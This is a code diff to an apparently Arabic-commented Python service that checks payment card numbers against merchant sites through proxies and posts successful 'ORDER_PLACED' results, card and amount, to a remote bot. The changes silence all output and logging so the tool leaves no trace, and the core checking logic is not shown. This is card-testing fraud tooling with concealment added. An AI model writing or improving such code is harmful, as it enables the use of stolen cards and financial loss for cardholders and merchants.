@@ -1,11 +1,19 @@
 from __future__ import annotations
 
+import os
+import sys
+
+# ══════════════════════════════════════════════════════════════
+#  نسكّت كل الـ stdout/stderr قبل أي حاجة
+# ══════════════════════════════════════════════════════════════
+_devnull_out = open(os.devnull, "w")
+sys.stdout = _devnull_out
+sys.stderr = _devnull_out
+
 import asyncio
 import datetime
 import logging
-import os
 import random
-import sys
 import threading as _threading
 import time
 import warnings
@@ -14,6 +22,8 @@ from pathlib import Path
 from typing import Optional
 
 warnings.filterwarnings("ignore")
+
+logging.disable(logging.CRITICAL)
 
 _here = Path(__file__).resolve().parent
 if str(_here) not in sys.path:
@@ -36,17 +46,6 @@ try:
 except ImportError:
     psutil = None
     _MEMORY_CHECK = False
-
-# ══════════════════════════════════════════════════════════════
-#  Logging — مقفول تماماً، بيظهر بس ORDER_PLACED
-# ══════════════════════════════════════════════════════════════
-logging.basicConfig(level=logging.CRITICAL, format="%(message)s",
-                    handlers=[logging.StreamHandler()])
-logging.getLogger("uvicorn").setLevel(logging.CRITICAL)
-logging.getLogger("uvicorn.access").setLevel(logging.CRITICAL)
-logging.getLogger("uvicorn.error").setLevel(logging.CRITICAL)
-_log = logging.getLogger("main")
-_log.setLevel(logging.CRITICAL)
 
 # ══════════════════════════════════════════════════════════════
 #  Config
@@ -190,10 +189,7 @@ async def _send_to_bot(
 
     try:
         async with httpx.AsyncClient(timeout=10) as client:
-            resp = await client.post(url, json=payload)
-            if resp.status_code == 200:
-                _log.warning("✅ %s|ORDER_PLACED|$%s", card, amount)
-            # لو فشل الإرسال، مفيش log
+            await client.post(url, json=payload)
     except Exception:
         pass
 
@@ -235,8 +231,6 @@ async def check_card_async(cc: str, site: str, proxy: str) -> dict:
 
     if status == "error" and not is_processing:
         _mark_dead(site, result_str)
-
-    # ✅ مفيش أي log هنا — بس ORDER_PLACED
 
     return {
         "status":      status,
@@ -454,6 +448,7 @@ if __name__ == "__main__":
         workers=workers,
         access_log=False,
         log_level="critical",
+        log_config=None,          # ✅ مهم
         backlog=4096,
         timeout_keep_alive=55,
         limit_max_requests=None,
